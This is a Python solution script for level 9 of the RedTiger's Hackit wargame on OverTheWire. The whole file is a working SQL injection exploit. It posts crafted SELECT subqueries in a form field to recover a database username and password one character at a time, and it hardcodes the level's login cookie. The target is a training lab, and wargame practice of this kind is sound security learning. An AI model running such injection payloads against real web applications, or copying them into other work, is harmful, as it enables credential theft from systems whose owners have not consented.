# RedTiger's Hackit: Level 9
# woanmeo11

import requests, re

def send(s):
    url = 'https://redtiger.labs.overthewire.org/level9.php'
    cookies = {'level9login': 'network_pancakes_milk_and_wine'}
    data = {
        'text': f"' + (SELECT {s} FROM level9_users) + '",
        'post': 'Submit Query'
    }
    
    response = requests.post(url, data, cookies=cookies)
    return int(re.findall('Title:  <br>(.*) <br><br>', response.text)[0])


username_length = send('LENGTH(username)')
password_length = send('LENGTH(password)')
username = password = ''

for i in range(username_length):
    c = send(f'ORD(RIGHT(username, {i + 1}))')
    username = chr(c) + username
    print(c, chr(c))
print(username)

for i in range(password_length):
    c = send(f'ORD(RIGHT(password, {i + 1}))')
    password = chr(c) + password
    print(c, chr(c))
print(password)
